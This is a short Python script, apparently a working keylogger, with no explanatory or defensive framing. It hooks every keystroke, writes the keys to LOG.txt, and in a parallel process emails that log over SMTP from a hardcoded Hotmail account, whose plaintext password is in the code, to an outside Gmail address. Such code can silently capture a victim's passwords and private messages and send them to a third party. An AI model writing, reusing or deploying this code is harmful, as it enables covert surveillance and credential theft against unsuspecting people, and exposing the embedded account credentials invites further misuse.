import keyboard
import os
from email import message_from_file
import smtplib
import multiprocessing

def writer(data):
    with open("LOG.txt", "a") as file:
        file.write(data)

def logger(event):
    writer(filter(event.name))

def filter(char):
    if char == ("space"):
        return (" ")
    if len(char) > 1:
        return ("[%s]") % char
    else:
        return char

def x():
    keyboard.on_press(logger)
    keyboard.wait()
    
def send_report():
    if os.path.exists("LOG.txt"):
        with open("LOG.txt", "r") as file:
            msg = message_from_file(file)
            msg["From"] = ("theklggerdead@hotmail.com")
            msg["To"] = ("juanchislozano08@gmail.com")
            msg["Subject"] = ("Report")

            s = smtplib.SMTP("smtp.office365.com", 587)
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login("theklggerdead@hotmail.com", "Euf5g-qBFZPX*t5")
            s.sendmail("theklggerdead@hotmail.com", "juanchislozano08@gmail.com",
            msg.as_string())

        
if __name__ == "__main__":
    try:
        p1 = multiprocessing.Process(target=x)
        p2 = multiprocessing.Process(target=send_report)

        p1.start()
        p2.start()

        p1.join()
        p2.join()
    except KeyboardInterrupt:
        print("\nDetected CTRL + C, Closing")
    except:
        print("\nAn Unexpected Error Has Ocurred")
